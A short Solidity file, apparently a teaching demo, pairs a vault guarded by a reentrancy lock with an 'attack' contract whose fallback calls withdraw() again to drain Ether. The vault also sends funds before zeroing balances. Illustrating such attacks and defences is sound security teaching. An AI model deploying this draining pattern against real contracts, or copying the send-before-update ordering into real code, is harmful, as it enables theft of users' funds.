//SPDX-License-Identifier: MIT

pragma solidity ^0.8.13;

contract vault {

    mapping(address => uint) public balances;
    bool public started = false;

    modifier noAttack() {
        require(!started, "Ah ah ah! You can't loop through here!");
        started = true;
        _;
        started = false;
    }

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public noAttack {
        require(balances[msg.sender] > 0, "You do not have anything to withdraw.");

        (bool tryToSend, /*Data*/) = msg.sender.call{value: balances[msg.sender]}("");
        require(tryToSend, "Transaction failed to go through.");
        balances[msg.sender] = 0;
    }
}   

contract attack {
    vault public theVault;

    constructor(address _contractToHack) {
        theVault = vault(_contractToHack);
    }

    function exploit() public payable {
        theVault.deposit{value: msg.value}();
        theVault.withdraw();
    }

    fallback() external payable {
        if(address(theVault).balance >= 1 ether) {
            theVault.withdraw();
        }
    }
}